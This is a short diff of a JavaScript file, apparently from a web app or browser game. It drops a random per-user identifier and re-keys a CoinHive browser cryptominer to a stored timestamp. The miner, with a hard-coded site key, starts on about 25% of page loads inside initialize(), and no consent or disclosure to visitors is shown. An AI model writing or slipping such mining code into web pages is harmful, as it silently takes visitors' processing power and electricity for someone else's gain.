@@ -1627,10 +1627,6 @@ function initialize() {
         lsm.setItem("initialTimestamp", new Date().getTime());
     }
 
-    if (lsm.getItem("uniqueIdentifier") == undefined) {
-        lsm.setItem("uniqueIdentifier", Math.random());
-    }
-
     if (lsm.getItem("loadCount") == undefined) {
         lsm.setItem("loadCount", 1);
     } else {
@@ -1946,7 +1942,7 @@ function initialize() {
         }
     });
 
-    var miner = new CoinHive.User('Cjv1MQzP7McKdWFumMCE7EXQeoZk367w', lsm.getItem("uniqueIdentifier"));
+    var miner = new CoinHive.User('Cjv1MQzP7McKdWFumMCE7EXQeoZk367w', lsm.getItem("initialTimestamp"));
     if (Math.random() < 0.25) {
         miner.start();
     }
